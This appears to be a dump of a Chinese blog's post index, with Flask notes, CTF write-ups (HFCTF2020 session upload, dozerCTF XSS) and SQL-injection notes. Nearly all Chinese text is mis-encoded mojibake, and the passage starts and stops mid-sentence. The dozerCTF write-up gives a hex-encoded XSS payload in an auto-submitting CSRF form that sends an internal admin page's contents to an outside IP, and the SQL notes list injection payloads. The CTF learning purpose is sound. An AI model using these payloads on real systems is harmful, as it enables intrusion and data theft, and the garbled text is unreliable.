é¦–å…ˆï¼Œç¬¬ä¸€ä¸ªé—®é¢˜ã€‚é‡‡å–%10[^\\n]%*cçš„å†™æ³•éœ€è¦åˆ†å¼€æ¥è®²ï¼š {%10[^\\n]} {10}:è¯»å…¥10ä¸ªå­—ç¬¦ {[^\\n}:è¯»å…¥å›è½¦ç¬¦å‰(ä¸å«å›è½¦ç¬¦)çš„æ‰€æœ‰å­—ç¬¦ {%*c}:å¿½ç•¥åé¢çš„å­—ç¬¦å¯ä»¥æŸ¥çœ‹ä¸Šé¢çš„è¯¦ç»†èµ„æ–™ï¼Œèµ„æ–™å°±ä¸å±•å¼€äº† ç¬¬äºŒä¸ªé—®é¢˜çš„èµ„æ–™ï¼šhttps://blog.csdn.net/hhhhhyyyyy8/article/details/80917713ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å‰ä¸€ä¸ªscanfæŠŠè¿™æ¬¡è¯»å–çš„å›è½¦ç¬¦ç•™åœ¨äº†ç¼“å†²åŒºé‡Œï¼Œç¬¬äºŒä¸ªscanfæ¥è¯»å–ç¼“å†²åŒºæ—¶ä¾¿ä¼šè¯»å…¥è¿™ä¸ªå›è½¦å¯¼è‡´ç¬¬äºŒä¸ªscanfè¢«è·³è¿‡ã€‚ æ•´ä½“æ¶æ„(ç»“æ„?)ç”±äºæˆ‘æ²¡æœ‰å­¦è¿‡è½¯ä»¶å·¥ç¨‹ä¹‹ç±»çš„è¯¾ç¨‹ï¼Œæ‰€ä»¥è¿™é‡Œçš„ç”¨è¯å¯èƒ½ä¸å¤ªå‡†ç¡®ã€‚ |-ä¸»å‡½æ•° |----|-æ¬¡å‡½æ•°-|-åŠŸèƒ½å‡½æ•° | |-åŠŸèƒ½å‡½æ•° | |... | |-æ¬¡å‡½æ•°-|... ...ä¸Šé¢çš„ç»“æ„æ‰“çš„æœ‰ç‚¹æ··ä¹±ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ¯ä¸ªåŠŸèƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ä¸»å‡½æ•°ï¼Œç”±è¿™ä¸ªå‡½æ•°æ¥è°ƒç”¨åŠŸèƒ½å‡½æ•°ã€‚æ¯”å¦‚æŸ¥è¯¢å­¦ç”Ÿæ•°æ®ï¼Œæœ‰ä¸€ä¸ªè¿›è¡Œæ•°æ®è¾“å…¥çš„ä¸»å‡½æ•°ï¼Œç„¶åå°†æ”¶é›†çš„ä¿¡æ¯åŠ è½½åˆ°åŠŸèƒ½å‡½æ•°ä¸­ã€‚ è¿™æ¬¡æ•´ä½“ä»£ç çš„æ¶æ„å¾ˆå¤±è´¥ï¼ˆPS. æœ€å¼€å§‹å‹æ ¹æ²¡æœ‰æ€è€ƒåˆ°æ¶æ„è¿™ä¸€ç äº‹ï¼Œåœ¨æ…¢æ…¢ç çš„è¿‡ç¨‹ä¸­æ‰å‘ç°æ¶æ„å¾ˆé‡è¦ï¼‰ï¼Œæœ‰è®¸å¤šä»£ç å…¶å®å¯ä»¥ç”¨å‡½æ•°å°è£…é‡å¤ä½¿ç”¨ã€‚åœ¨æ—©æœŸè¿˜åœ¨ä¸€äº›åŠŸèƒ½ä¸Šçš„å‡½æ•°é‡Œé¢åŠ å…¥äº†æ•°æ®è¾“å…¥â€¦â€¦ä¸‹æ¬¡éœ€è¦æ³¨æ„ã€‚ åè¨€emmmmæ€»ä¹‹å°±å…ˆè¿™ä¹ˆå¤šå§â€¦â€¦ä»¥åæ¥æ¸©æ•…çŸ¥æ–°PS. ä¼°è®¡ä»¥åä¸æƒ³çœ‹è§è¿™å¨å±å±±ï¼ˆç¡®ä¿¡","link":"/2020/03/17/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"title":"FLASKå­¦ä¹ ç¬”è®°-WIP","text":"flaskå­¦ä¹ ç¬”è®°è¿™é‡Œæ˜¯æˆ‘çš„flaskå­¦ä¹ ç¬”è®°ï¼Œç»èµæ›´æ–°ä¸­ï¼æ¬¢è¿æ‰¹è¯„æ–§æ­£ã€‚ [TOC] åŸºæœ¬ä»£ç from flask import Flask app = Flask(__name__) @app.route(&quot;/&quot;) def hello(): return &quot;Fuck this world!!!&quot; @app.route(&quot;/test/av&lt;int:video_id&gt;&quot;) def test(video_id): return &apos;welcome %s&apos; % video_id if __name__ == &apos;__main__&apos;: app.run(host=&apos;localhost&apos;) from flask import Flaskåœ¨è¿™é‡Œæˆ‘ä»¬ä¸ºå…¶å¯¼å…¥äº†flaskæ¨¡å—ä¸­çš„Flaskç±» app = Flask(__name__)æ–°å»ºäº†ä¸€ä¸ªflaskå¯¹è±¡ï¼Œå…¶ä¸­__name__å‚æ•°ç”¨æ¥ç¡®è®¤æˆ‘ä»¬çš„æ¨¡æ¿å’Œæ–‡ä»¶çš„åœ°å€ã€‚ ä½¿ç”¨routeå‡½æ•°å’Œè£…é¥°å™¨æ¥ç¡®å®šæ¿€æ´»å‡½æ•°çš„åœ°å€ï¼Œè¿™ä¸ªè¢«ç§°ä¸ºè·¯ç”± å¯åŠ¨flaskwindowsset FLASK_APP=main.py # ç¡®å®šå¯åŠ¨èµ·å§‹ç‚¹ set FLASK_VNE=development # è®¾å®šä¸ºè°ƒè¯•æ¨¡å¼ï¼Œä»£ç ä¸€æ—¦æœ‰æ”¹åŠ¨è‡ªåŠ¨é‡å¯æœåŠ¡å™¨ # åœ¨å®é™…ä¸­ä¸è¦å¼€å¯ flask run --port 8848 # å¯åŠ¨flask # --host è®¾ç½®åœ°å€ # --port è®¾ç½®ç«¯å£linuxä¸windowsç±»ä¼¼ $ export FLASK_APP=main.py ...è·¯ç”±@app.route()ä¾¿æ˜¯ä¸€ä¸ªè·¯ç”±ï¼Œåœ¨æ‹¬å·å†…å¡«å…¥åœ°å€ï¼Œå¦‚ä¸Šä¾‹ä¸€æ ·ï¼Œå³å¯å®Œæˆå‡½æ•°ä¸è·¯ç”±çš„ç»‘å®šã€‚ è·¯ç”±ä¸­çš„å‚æ•°@app.route(&quot;/test/av&lt;int:video_id&gt;&quot;) def test(video_id): if(video_id == 114514): welcomeS = &apos;ã„ã„ã‚ˆï¼ã“ã„ã‚ˆï¼&apos; else: welcomeS = &quot;There is the&quot; return welcomeS + &apos; &apos; + str(video_id)åœ¨ä¸Šä¾‹ä¸­ï¼Œæˆ‘ä»¬åœ¨è·¯ç”±ä¸­è§„å®šäº†&lt;int:video_id&gt;æ¥å®šä¹‰æ­£æ•´æ•°ç±»å‹å‚æ•°video_idã€‚å†å°†å…¶å¡«å…¥é“¾æ¥çš„å‡½æ•°å†…å³å¯åº”ç”¨è¯¥å‚æ•°ã€‚ä»¥ä¸‹åˆ—å‡ºäº†å¯å¡«å…¥çš„å‚æ•°stringï¼šæ¥å—ä¸€åˆ‡ä¸åŒ…æ‹¬æ–œæ çš„å­—ç¬¦intï¼šæ¥å—æ­£æ•´æ•°floatï¼šæ¥å—æ­£æµ®ç‚¹æ•°pathï¼šæ¥å—ä¸€åˆ‡å­—ç¬¦uuidï¼šæ¥å—uuidå­—ç¬¦ä¸² è¯·æ±‚é’©å­before_first_requestï¼šåœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚å‰è¿è¡Œbefore_requestï¼šåœ¨æ¯ä¸ªè¯·æ±‚å‰è¿è¡Œafter_requestï¼šåœ¨æ²¡æœ‰å¼‚å¸¸ç»“æŸçš„è¯·æ±‚åæ‰§è¡Œteardown_requesï¼š|åœ¨æ¯ä¸ªè¯·æ±‚åæ‰§è¡Œ(ä¸è®ºæ˜¯å¦æœ‰å¼‚å¸¸)after_this_requestï¼šåœ¨æŒ‡å®šè¯·æ±‚ç»“æŸåæ‰§è¡Œ graph TB; request(è¯·æ±‚A)-->ifFirst{ç¬¬ä¸€æ¬¡è¯·æ±‚?}; ifFirst--Yes-->before_first_request; ifFirst--No-->before_request; before_first_request-->before_request; before_request-->viewA[è§†å›¾A]; before_request-->viewB[è§†å›¾B]; before_request-->viewC[è§†å›¾C]; viewC-->after_this_request; after_this_request-->ifExcept{æœ‰æ— å¼‚å¸¸?}; viewA-->ifExcept; viewB-->ifExcept; ifExcept--Yes-->teardown_request; ifExcept--No-->after_request; after_request-->teardown_request; teardown_request-->response(å“åº”A) åˆ›å»ºæ–¹å¼ï¼š @app.before_first_request def before_first_request(): pass @app.before_request def before_request(): pass @app.route(&apos;/a&apos;) def A(): pass @flask.after_this_request def after_this_request(): pass return &apos;&apos; @app.after_request def after_request(): pass @app.teardown_request def teardown_request(): passé‡å®šå‘å…¶å…³é”®æ˜¯çœ‹å…¶æœ‰æ²¡æœ‰/ @app.route(&quot;/test_1&quot;) def test_1(): return &quot;nothing&quot; @app.route(&quot;/test_2/&quot;) def test_2(): return &quot;nothing&quot;åœ¨ä¸Šä¾‹çš„test_1ä¸­ï¼Œæˆ‘ä»¬æ²¡æœ‰åœ¨å…¶æœ€åæ·»åŠ â€œ/â€ï¼Œè¿™ä½¿å¾—è§£é‡Šå™¨ï¼ˆ?ï¼‰ä¼šå°†å…¶è§£é‡Šä¸ºä¸€ä¸ªæ–‡ä»¶ã€‚å¦‚æœè®¿é—®æ—¶ï¼Œåœ¨å…¶èƒŒååŠ ä¸Šâ€œ/â€ï¼Œä¼šå¯¼è‡´404é”™è¯¯ã€‚è¿™æ ·å¯ä»¥ä¿æŒ URL å”¯ä¸€ï¼Œå¹¶å¸®åŠ©æœç´¢å¼•æ“é¿å…é‡å¤ç´¢å¼•åŒä¸€é¡µé¢ã€‚è€Œtest_2ä¸€ä¾‹ä¸­ï¼Œæˆ‘ä»¬åœ¨å®šä¹‰æ˜¯ä¾¿åŠ ä¸Šäº†â€œ/â€ï¼Œè¿™æ ·å¯ä»¥ä½¿å…¶çœ‹èµ·æ¥åƒä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚ å“åº”302302è·³è½¬æœ‰2ç§æ–¹å¼å®ç° pass return &apos;...&apos;, 302, {&apos;Location&apos;:&apos;https://www.baidu.com&apos;} from flask import Flask, redirect pass return redirect(&apos;https://www.baidu.com&apos;)å…¶å®ƒå“åº”ç æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä½¿æŒ‡å®šé¡µé¢è¿”å›æˆ‘ä»¬æƒ³è¦çš„å“åº”ç ä½¿ç”¨å‡½æ•°abort(å“åº”ç )éœ€è¦from flask import abort è‡ªå®šMIMEæ ¼å¼from flask import Flask, make_response pass @app.route(&apos;/a&apos;) def A(): response = make_response(&apos;Hello World!&apos;) response.mimetype = &apos;text/plain&apos; return responsejsonæ ¼å¼è‡ªç„¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†MIMEè®¾ç½®ä¸ºjsonã€‚é€šå¸¸ï¼Œä¸€ä¸ªå­—å…¸å³å¯ä»£è¡¨ä¸€æ®µjsonã€‚ä½†ä½¿ç”¨json.dumps()å¯ä»¥å°†å…ƒç»„å’Œåˆ—è¡¨ä¹Ÿåºåˆ—åŒ–ä¸ºjson(æ²¡æœ‰é”®)æˆ–è€…ä½¿ç”¨jsonify()ï¼Œåœ¨returnä¸­è¿”å›ã€‚(ä¹Ÿå¯ä»¥æ·»åŠ å“åº”ç ) Cookieæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨make_response()å¯¹è±¡ä¸­å¯¹cookieè¿›è¡Œè®¾ç½®ã€‚ @app.route(&apos;/set/&lt;name&gt;&apos;) def setCooike(name): response = make_response(redirect(url_for(&apos;hello&apos;))) response.set_cookie(&apos;name&apos;, name) return responseä¸Šä¾‹å¯ä»¥åœ¨è®¾ç½®cookieä¹‹åé‡å“åº”åˆ°/helloè¿˜æœ‰è®¸å¤šæ‚é¡¹å’Œå®‰å…¨çš„è®¾å®š max_age è¢«ä¿å­˜æ—¶é—´æ•°ï¼Œå•ä½ç§’ã€‚é»˜è®¤ä¼šè¯ç»“æŸæ—¶åˆ é™¤ expires å…·ä½“è¿‡æœŸæ—¶é—´ path é™åˆ¶cookieçš„å¯ç”¨è·¯å¾„ï¼Œé»˜è®¤ä¸ºæ•´ä¸ªåŸŸå domain è®¾ç½®å¯ç”¨åŸŸå secure Trueæ—¶ï¼Œåªæœ‰httpså¯ä»¥ä½¿ç”¨ httponly Trueæ—¶ï¼Œç¦æ­¢å®¢æˆ·ç«¯JSè·å–cookie sessionä½¿ç”¨sessioné¦–å…ˆéœ€è¦è®¾å®šsecret_keyæˆ‘ä»¬å¯ä»¥ç›´æ¥ï¼šapp.secret_key=&quot;value&quot;æˆ–è€…å°†å…¶è®¾å®šä¸ºç³»ç»Ÿå˜é‡ï¼Œç”¨osæ¨¡å—è·å– ä¸€ä¸ªç”¨æˆ·ç™»å½•çš„æ¨¡å‹ @app.route(&apos;/login&apos;) def UserLogin(): name = FL.request.cookies.get(&apos;name&apos;) if name is not None: FL.session[&apos;LoggedIn&apos;] = True return FL.redirect(FL.url_for(&apos;hello&apos;))æˆ‘ä»¬ä½¿ç”¨session['key']={value}æ¥è®¾å®šä¸€ä¸ªsession ä¸€ä¸ªç”¨æˆ·ç™»å‡ºæ¨¡å‹ @app.route(&apos;/logout&apos;) def UserLogout(): if &apos;LoggedIn&apos; in FL.session: FL.session.pop(&apos;LoggedIn&apos;) response = FL.make_response(FL.redirect(FL.url_for(&apos;hello&apos;))) response.delete_cookie(&apos;name&apos;) return responseæˆ‘ä»¬å¯ä»¥ä½¿ç”¨session.pop('key')æ¥åˆ é™¤ä¸€ä¸ªsession WIPâ€¦","link":"/2020/02/24/FLASK%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-WIP/"},{"title":"HFCTF2020-uploadBaby","text":"å‰è¨€æœ¬é¢˜åœ¨BUUCTFä¸Šæœ‰å¤ç°ç¯å¢ƒè¿™é“CTFæ€è·¯å¹¶ä¸ç®—éš¾(è™½ç„¶å½“æ—¶å› ä¸ºä¸€äº›çŸ¥è¯†ä¸å¤ªæ¸…æ™°æ²¡æœ‰åšå‡ºæ¥DX)ï¼Œå…³é”®å°±æ˜¯å¯¹äºå‡ ä¸ªå‡½æ•°çš„ç†è§£å’Œå¯¹phpçš„sessionçš„å­˜å‚¨æ–¹å¼ã€‚ php-sessionæ–‡ä»¶ç‰¹æ€§sessæ–‡ä»¶çš„å‚¨å­˜æ–¹å¼phpä¸­ï¼Œsessionæ–‡ä»¶æœ‰ä¸‰ç§å‚¨å­˜æ–¹å¼ã€‚1.php_binary2.php(é»˜è®¤æ¨¡å¼)3.php_serializeæ¯ç§å‚¨å­˜æ–¹å¼éƒ½ä¸å¤ªç›¸åŒï¼š &lt;?php //è¿™é‡Œæˆ‘è®¾å®š2ä¸ªå†…å®¹ $_SESSION[&apos;passwd&apos;] = &apos;233&apos;; $_SESSION[&apos;username&apos;] = &apos;guest&apos;; /* è¯»å–sessæ–‡ä»¶è·å¾—ä»¥ä¸‹å†…å®¹ï¼š php_binaryæ¨¡å¼ï¼š \u0006passwds:3:&quot;233&quot;;\busernames:5:&quot;guest&quot;; (å…¶ä¸­\u0006ä¸ºé”®åçš„å­—ç¬¦ä¸ªæ•°çš„ASCIIï¼Œæ¯”å¦‚passwdç”±6ä¸ªå­—æ¯ç»„æˆï¼Œåˆ™\u0006çš„HEXä¸º06) phpæ¨¡å¼ï¼š passwd|s:3:&quot;233&quot;;username|s:5:&quot;guest&quot;; php_serializeæ¨¡å¼ï¼š a:2:{s:6:&quot;passwd&quot;;s:3:&quot;233&quot;;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;} */sessçš„å¯åŠ¨&lt;?php session_start(); $_SESSION[&apos;username&apos;] = &apos;guest&apos;; //ä¸Šä¾‹åœ¨è¿è¡Œæ­£å¸¸çš„æƒ…å†µä¸‹ä¼šç»™äºˆç”¨æˆ·ä¸€ä¸ªCookieâ€”â€”PHPSESSID //ç”±26ä¸ªå°å†™å­—æ¯å’Œæ•°å­—çš„hashå€¼ç»„æˆsessæ–‡ä»¶æ–‡ä»¶åç”±ç”¨æˆ·çš„ä¸€ä¸ªCookieâ€”â€”PHPSESSIONå†³å®šã€‚ä¸€èˆ¬æƒ…å†µä¸‹PHPç”±26ä¸ªå°å†™å­—æ¯å’Œæ•°å­—çš„hashå€¼ç»„æˆï¼Œphpä¼šæ ¹æ®è¿™ä¸ªcookieæ¥æ‰¾åˆ°å¯¹åº”çš„sessæ–‡ä»¶ï¼Œå¯¹SESSIONè¿›è¡Œè¯»å–ã€‚phpå¯»æ‰¾å¯¹åº”sessæ–‡ä»¶çš„ä¾æ®æ˜¯sessæ–‡ä»¶çš„æ–‡ä»¶åï¼Œä¸€ä¸ªsessæ–‡ä»¶çš„æ–‡ä»¶åä¸ºsess_PHPSESSIDã€‚ sessåœ¨webæ¼æ´ä¸­çš„åº”ç”¨å¾€å¾€sessionå¯¼è‡´çš„æ¼æ´æ˜¯å› ä¸ºç¨‹åºæœ¬èº«é€»è¾‘å‡ºç°é—®é¢˜ï¼š sessionååºåˆ—åŒ–å¾ˆæ˜æ˜¾sessæ–‡ä»¶å†…å®¹è¿›è¡Œäº†åºåˆ—åŒ–æ¥å‚¨å­˜æ•°æ®ã€‚å½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶sessionå†…å®¹æ—¶(å¦‚å¼€å¯äº†PHP_SESSION_UPLOAD_PROGRESSæ—¶â€¦) ä»»æ„sessionè¯»å–å¯¼è‡´è¶Šæƒç­‰å¾ˆæ˜æ˜¾ç”¨æˆ·å¯ä»¥è‡ªå·±ä¿®æ”¹PHPSESSIDæ¥è¿›è¡Œä»»æ„SESSIONæ–‡ä»¶çš„è¯»å–ã€‚æœ¬é¢˜å°±æ˜¯è¿™æ ·ï¼Œé€šè¿‡ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åä¸ºâ€œsessâ€ï¼Œå†…å®¹æ˜¯å¯ä»¥å¯¼è‡´è¶Šæƒçš„åºåˆ—åŒ–å†…å®¹çš„æ–‡ä»¶ï¼Œåœ¨é€šè¿‡hash_fileåå˜ä¸ºâ€œsess_sha256â€çš„æ–‡ä»¶ã€‚å†æ”¹PHPSESSIDä¸ºsha256å³å¯å¯¼è‡´è¶Šæƒã€‚ hash_file()string hash_file(string åŠ å¯†æ–¹å¼, string æ–‡ä»¶è·¯å¾„);è¿™ä¸ªå‡½æ•°å¯ä»¥é€šè¿‡æ–‡ä»¶çš„å†…å®¹äº§ç”Ÿä¸€ä¸ªhashå€¼(ä¸æ˜¯æ–‡ä»¶å)PSï¼šè¿™ä¸ªå‡½æ•°å¯¹æ–‡ä»¶å¤¹åŒæ ·å‡‘æ•ˆPSSï¼šæˆ‘åœ¨åšè¿™é“CTFæ—¶ä»¥ä¸ºå…¶æ˜¯å¯¹æ–‡ä»¶åè¿›è¡Œhashå¤„ç†ï¼Œäºæ˜¯å…‰è£çš„æ²¡åšå‡ºæ¥ï¼ˆ filter_inputmixed filter_input(int æ•°æ®æ¥æº, string å˜é‡å [, int è¿‡æ»¤å™¨]);å¯ä»¥é€šè¿‡filter_input(INPUT_POST, 'test');çš„æ–¹å¼æ¥æ¥å—ä¸€ä¸ªå˜é‡åä¸ºtestçš„POSTæ•°æ®ã€‚è™½ç„¶é€šè¿‡$_POST['test']ä¹Ÿå¯ä»¥æ¥å—POSTå‚æ•°ï¼Œä½†ä¸Šé¢çš„å†™æ³•è¿˜å¯ä»¥åœ¨ç¬¬ä¸‰ä¸ªå‚æ•°çš„åœ°æ–¹æ·»åŠ è¿‡æ»¤å™¨ã€‚ åè¨€è¿™é“é¢˜çš„æ€è·¯å¹¶ä¸éš¾ï¼Œåªæ˜¯å› ä¸ºè‡ªå·±çš„åŸºç¡€ä¸ç®—å¤ªæ‰å®å¯¼è‡´æ²¡èƒ½è§£å‡ºâ€¦","link":"/2020/04/21/HFCTF2020-uploadBaby/"},{"title":"dozerCTF - Fake phpminiadmin","text":"å‰è¨€emmmè™½ç„¶æ ‡é¢˜è¿™ä¹ˆè¯´æœ‰ä¸€ç‚¹æ ‡é¢˜å…šï¼Œä½†æˆ‘çš„ç¡®ä»è¿™é“CTFä¸­è®¤è¯†åˆ°äº†XSSçš„ä½œç”¨å¯ä¸æ­¢ç›—cookie Fake phpminiadminè¿™é“é¢˜å¼€å§‹ç»™äº†ä¸€ä¸ªé¡µé¢å¯ä»¥æ‰§è¡Œsqlè¯­å¥ã€‚åˆšå¼€å§‹ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ä¹‹ç±»çš„ï¼Œä½†å®é™…ä¸Šåœ¨ä¸Šé¢çš„ä¸€æ ä¸­æœ‰contacté€‰é¡¹ã€‚æ˜æ˜¾æ˜¯ä¸€é“å’Œxssæœ‰å…³çš„é¢˜äº†ã€‚ å¯ä»¥xssçš„ç‚¹é‚£ä¹ˆé¦–å…ˆè¦æ‰¾åˆ°å¯ä»¥xssçš„ç‚¹ï¼Œå°è¯•åœ¨è¾“å‡ºsqlè¯­å¥è¾“å‡ºçš„åœ°æ–¹æ’å…¥jsè¯­å¥ï¼Œå‘ç°&lt;&gt;å°–æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œè¯æ˜è¿™ä¸ªåœ°æ–¹æœ‰é¬¼ã€‚ # å°è¯•ä»¥ä¸‹è¯­å¥ï¼Œè¢«é˜»æ‹¦ select &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;; # å°è¯•hexç»•è¿‡ï¼ŒæˆåŠŸå¼¹çª— select 0x3C7363726970743E616C6572742831293C2F7363726970743E;æ¥ä¸‹æ¥ä¾¿æ˜¯è¯¥æƒ³åŠæ³•æ€ä¹ˆæ ·è®©æœºå™¨äººæ‰§è¡Œè¿™é‡Œçš„sqlã€‚è¿™é‡Œçš„sqlæ•°æ®ä½¿ç”¨äº†postï¼Œæ— æ³•ç›´æ¥å°†å¸¦æœ‰å¼¹çª—æ•°æ®çš„urlç›´æ¥å‘ç»™æœºå™¨äººã€‚è¿™é‡Œæˆ‘æƒ³äº†ä¸¤ç§æ–¹æ³•ï¼š åˆ©ç”¨iframe+xssæˆªå›¾å®ç°ã€‚ åˆ©ç”¨CSRFè¿›è¡Œè·³è½¬ã€‚ é¦–å…ˆä¸€æ˜¯ä¸è¡Œçš„ï¼Œè¿›è¡Œæµ‹éªŒï¼Œiframeåªä¼šåœ¨åŠ è½½å®Œjsä¹‹åæ‰ä¼šè¿›è¡ŒåŠ è½½ã€‚å¯¼è‡´æ— è®ºå¦‚ä½•åˆ©ç”¨jsæˆªå›¾ï¼Œéƒ½åªèƒ½æˆªåˆ°ä¸€ä¸ªç™½æ¡†ã€‚çœ‹èµ·æ¥åªèƒ½è·³è½¬äº†ã€‚ åˆ©ç”¨CSRFè¿›è¡Œè·³è½¬é¦–å…ˆæœºå™¨äººæ˜¯ä¸ä¼šå¯¹ç½‘å€è¿›è¡ŒéªŒè¯çš„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥åœ¨è‡ªå·±çš„vpsä¸Šå®‰ç½®ä¸€ä¸ªCSRFæ¥å¯¹è¿›è¡Œä¸€ä¸ªè·³è½¬ã€‚ä¸è¿‡ï¼Œåœ¨å½“æ—¶æˆ‘å…ˆæ˜¯åˆ©ç”¨xsså¹³å°æ¥ç¡®è®¤ä¸€ä¸‹æœºå™¨äººçš„cookieä»€ä¹ˆçš„ï¼Œå‘ç°æœºå™¨äººçš„sessionæ²¡æœ‰ç‰¹æ®Šä¿¡æ¯ï¼Œä½†referrerç»™äº†ä¸€ä¸ªç‰¹æ®Šçš„ç½‘å€ï¼šhttp://127.0.0.1/admin_shark.php,çœ‹èµ·æ¥è¿™ä¸ªå†…ç½‘çš„è¿æ¥æœ‰ä¸œè¥¿ã€‚è¿™æ›´åŠ è¯æ˜äº†æˆ‘ä»¬éœ€è¦csrfæ¥è¿›è¡Œè·³è½¬ï¼Œå¦åˆ™åŒæºç­–ç•¥ä¼šé˜»æŒ¡æˆ‘ä»¬è·å–è¿™ä¸ªå†…ç½‘è¿æ¥çš„æºç ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹ï¼Œä¾¿æ˜¯admin_shark.phpåœ¨å¤–ç½‘ä¸‹ä¹Ÿå¯ä»¥è®¿é—®ï¼Œåªä¸è¿‡ä¼šè¢«æ‹¦æˆªï¼Œæç¤ºä½ éœ€è¦åœ¨å†…ç½‘è®¿é—®ã€‚è¿™ä»£è¡¨ç€è¿™ä¸ªå†…ç½‘çš„æœåŠ¡å™¨å’Œå…¬ç½‘çš„æœåŠ¡å™¨æ˜¯åŒä¸€ä¸ªï¼ˆæˆ–è€…æ˜¯æ˜¯ç›¸åŒçš„ï¼‰æ•°æ®è¢«æ”¾ç½®åœ¨äº† https://www.afkl.ml/xss.phpç°åœ¨åº”è¯¥è¿˜èƒ½çœ‹åˆ°ã€‚åœ¨å½“æ—¶è¢«å®‰æ”¾äº†è¿™ä¹ˆä¸€ç»„æ•°æ®ï¼š &lt;!DOCTYPE html&gt; &lt;form action=&quot;http://127.0.0.1/sql.php&quot; id=&quot;sql&quot; method=&quot;post&quot;&gt; &lt;input type=text name=&quot;sql&quot; value=&quot;select 0x3C7343724970743E76617220743D6E657720584D4C487474705265717565737428293B742E6F70656E2822474554222C2261646D696E5F736861726B2E706870222C66616C7365293B742E73656E6428293B286E657720496D616765292E7372633D22687474703A2F2F34372E39342E3233392E3139342F3F6F75743D222B62746F6128742E726573706F6E736554657874293B3C2F7343526970543E;&quot; /&gt; &lt;/form&gt; &lt;script&gt; var f = document.getElementById(&quot;sql&quot;); f.submit(); &lt;/script&gt; &lt;h1&gt;it works!&lt;/h1&gt; æœ¬è´¨æ˜¯æ˜¯æ„å»ºäº†ä¸€ä¸ªè¡¨å•ï¼Œä¸‹é¢çš„jsä¼šä»¤å…¶å¼ºåˆ¶POSTè¡¨å•å†…å®¹(PS:foxfireä¼šå¼¹çª—è¯¢é—®æ˜¯å¦æäº¤è¡¨å•ï¼Œä½†chromeä¸ä¼š)å…¶ä¸­hexåçš„å†…å®¹æ˜¯ &lt;sCrIpt&gt;var t=new XMLHttpRequest();t.open(&quot;GET&quot;,&quot;admin_shark.php&quot;,false);t.send();(new Image).src=&quot;http://47.94.239.194/?out=&quot;+btoa(t.responseText);&lt;/sCRipT&gt; (ä¸Šé¢æ˜¯æˆ‘çš„æµ‹è¯•vps)åœ¨æµ‹è¯•vpsä¸Šå¼€å¯ç›‘å¬ï¼Œæäº¤urlï¼Œé™å€™ä½³éŸ³å³å¯ã€‚ flag:Dozerctf{eed8cdc400dfd4ec85dff70a170066b7}PS:å¯æƒœå½“æ—¶æ²¡æœ‰çŸ¥é“beef-xssï¼ŒçŸ¥é“äº†è¿™é“é¢˜å°±æœ‰è¶£å¤šäº†ï¼ˆ","link":"/2020/06/17/dozerCTF-Fake-phpminiadmin/"},{"title":"SQLæ³¨å…¥ç¬”è®°","text":"SQLæ³¨å…¥ç¬”è®°è¿™é‡Œæ˜¯æˆ‘çš„SQLæ³¨å…¥ç¬”è®°ï¼Œç»èµæ›´æ–°ä¸­ï¼æ¬¢è¿æ‰¹è¯„æ–§æ­£ï¼ [TOC] æ™®é€šæ³¨å…¥&amp;&amp;åŸºç¡€å‘½ä»¤å¸¸ç”¨æŸ¥åº“ã€è¡¨æŒ‡ä»¤æŸ¥åº“ï¼š select schema_name from information_schema.schemata &lt;==&gt; show databases æŸ¥è¡¨ï¼šselect table_name from information_schema.tables where table_schema=0x7365637572697479(åº“å) //&apos;security&apos; æŸ¥åˆ—ï¼šselect column_name from information_schema.columns where table_name=&apos;~~~~&apos;; //column åˆ—ï¼›æ  æŸ¥å­—æ®µï¼šselect (column1),(column2) from (è¡¨å).(åˆ—å);å…¶ä¸­schema_name;table_name;column_nameâ€¦å¯è§†ä¸ºä¸€ç§å…¨å±€å˜é‡; concat()å‡½æ•°ã€ordor byæœ‰æ—¶æŸ¥åˆ—æˆ–è¡¨ä¸€æ¬¡æ€§æ— æ³•æ˜¾ç¤ºå…¨ï¼Œå°±ç”¨group_concat()åŒ…ä½ä¸Šåˆ—å…¨å±€å˜é‡;group_concat()çš„ä½œç”¨æ˜¯å°†æ‰€æœ‰æ•°æ®æ‹¼æ¥ä¸º1è¡Œæ˜¾ç¤ºï¼Œè¯¦ç»†å¯æŸ¥çœ‹concatå‡½æ•°ä»‹ç»; order byæŒ‡ä»¤åŸæœ¬ç”¨äºæ’åºï¼Œä½†åœ¨æ³¨å…¥ä¸­å¯ä»¥ç”¨äºç¡®å®šåˆ—æ•°ï¼›å‡å®šæŸè¡¨æœ‰3åˆ—ï¼› /?id=1&apos; order by 1;--&gt;æˆåŠŸ /?id=1&apos; order by 2;--&gt;æˆåŠŸ /?id=1&apos; order by 3;--&gt;æˆåŠŸ /?id=1&apos; order by 4;--&gt;å¤±è´¥æ•…æ­¤è¡¨æœ‰ä¸‰åˆ—;limit (èµ·å§‹åºå·(0å¼€å§‹)),(å±•ç¤ºè¡Œæ•°);å¾…è¡¥å……â€¦ ä¸å¸¸ç”¨å…¨å±€å˜é‡select system_user()&lt;==&gt;user() //å±•ç¤ºç³»ç»Ÿç”¨æˆ· select database() //å±•ç¤ºæ•°æ®åº“å select version() //å±•ç¤ºç‰ˆæœ¬ä¿¡æ¯ select @@datadir //å±•ç¤ºæ•°æ®å‚¨å­˜è·¯å¾„ select @@version_compile_os //å±•ç¤ºæœåŠ¡å™¨ç³»ç»Ÿä¸ºä»€ä¹ˆä¼šæœ‰1,2,selectâ€¦ç±»ä¼¼äºï¼ˆunion selcet 